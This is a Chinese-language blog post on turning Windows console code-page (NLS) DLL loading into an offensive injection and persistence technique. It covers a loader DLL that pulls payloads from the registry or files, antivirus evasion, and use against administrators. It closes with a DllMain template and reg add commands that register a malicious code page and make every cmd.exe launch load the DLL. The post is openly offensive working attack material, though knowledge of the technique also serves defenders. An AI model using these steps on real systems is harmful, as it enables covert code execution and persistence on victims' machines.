---
title: Code Page注入方法的武器化
date: 2022-11-25 21:03:31
categories: 
- 注入
tags:
- 注入
- CodePage
- NLS
- 武器化
---
# 起源

一年多以前，[Jonas L](https://twitter.com/jonasLyk)在[推特](https://twitter.com/jonasLyk/status/1352729173631135751)首次提出了这个注入方法，并在评论区提出了一些可能的利用方法。半年前，有人在GitHub发布了一份[Poc](https://github.com/NtQuerySystemInformation/NlsCodeInjectionThroughRegistry)，某种程度上进行了对注入方案的验证。

# 原理

控制台程序，会有一个对应的Code Page，也就是代码页，这个东西是字符代码的一个映射，每个控制台对应两个代码页，一个输入一个输出。

大部分Code Page都是nls文件，但是看到有一部分是dll文件，确切地说是5开头的五位数对应的部分（此处未经逆向，仅通过测试进行判断，如有错误，还请见谅）。通过修改或添加一个符合条件的代码页，就可以让使用这个代码页的进程加载这个dll。

根据文档，这个dll需要有一个名称为NlsDllCodePageTranslation的导出函数，来保证其正常加载。

在Jonas L的推特帖子中，使用控制台作为示例，直接通过chcp命令进行了演示，这也是最简单的一个实现方法。而后在评论区提到了SetThreadLocale、WM_INPUTLANGCHANGE等方法。后面出现的poc使用了SetThreadLocale的思路，但是由于api的限制，这个poc还使用了远程线程注入，所以只适合作为一个演示使用，并不适合在实战环境利用。

# 武器化思路

SetThreadLocale仅支持对当前线程进行修改，而WM_INPUTLANGCHANGE需求也较为苛刻。

所以，针对已有进程进行注入并不现实，剩下就是对新进程的注入，也就是通常说的spawn。

先考虑dll的问题，每次单独生成dll是不现实的，未经测试的陌生文件直接落地太不尊重目标机器的防护软件了。所以要考虑的就是使用一个通用的dll去加载指定位置的模块（dll或shellcode），所以可以制作一个从注册表、文件、环境变量等地方读取payload再加载的dll作为落地的文件。需要导出的NlsDllCodePageTranslation函数可以直接转发。

确定了文件的方案之后，就是修改代码页的问题。首先是添加带有自己dll的代码页，经过查询[文档](https://learn.microsoft.com/en-us/windows/console/console-code-pages)可以得知，修改 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage`即可。（这里的注册表键值默认路径是在对应的system32或者syswow64路径，可以通过..\回到上级目录，这里我选择的上级的Temp目录放置文件）

而后考虑修改程序对应的代码页，这里有两种方法：

* 如果直接选用cmd、powershell或类似的控制台程序作为spawn对象，可以在创建进程时指定将输入输出重定向（就是大部分远控或c2的远程shell实现原理），并输入chcp指令触发加载。
* 更通用的[方案](https://devblogs.microsoft.com/commandline/understanding-windows-console-host-settings/)是修改HKEY_CURRENT_USER\Console里的注册表项，添加控制台程序路径，并指定其使用的Code Page。

如果为了临时使用，可以使用第一种，如果想集成进现有框架，可以考虑第二个。第二个方案也可以作为一种被动触发的权限维持方案使用，适合针对运维人员。

至此，整套方案就已经可以投入使用了，但是存在一些缺点，使用时要注意

1. 目标进程必须是控制台进程
2. 添加代码页需要管理员权限（添加一次即可，后续不再需要管理员权限）
3. dll会落地，要考虑免杀
4. 不能用作inject，只能用于spawn

# 总结（演示）

首先制作一个dll文件（注意位数），示例代码：

```cpp
#include <windows.h>
#pragma comment(linker, "/export:NlsDllCodePageTranslation=\"C:\\Windows\\System32\\C_gsm7.NlsDllCodePageTranslation\"")
//#pragma comment(linker, "/export:NlsDllCodePageTranslation=\"C:\\Windows\\Syswow64\\C_gsm7.NlsDllCodePageTranslation\"")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        //Do Something You Want
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

将文件放置在C:\Windows\Temp中，并打开cmd输入如下命令行(记得修改第一行最后的文件名)：

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage" /v 55555 /d "..\Temp\qwqdanchun.dll" /f

reg add "HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe" /f

reg add "HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe"  /v CodePage /t REG_DWORD /d 55555 /f
```

之后每次启动cmd都会加载这个dll。如果使用其他控制台程序，修改后两行的注册表项的名称即可。
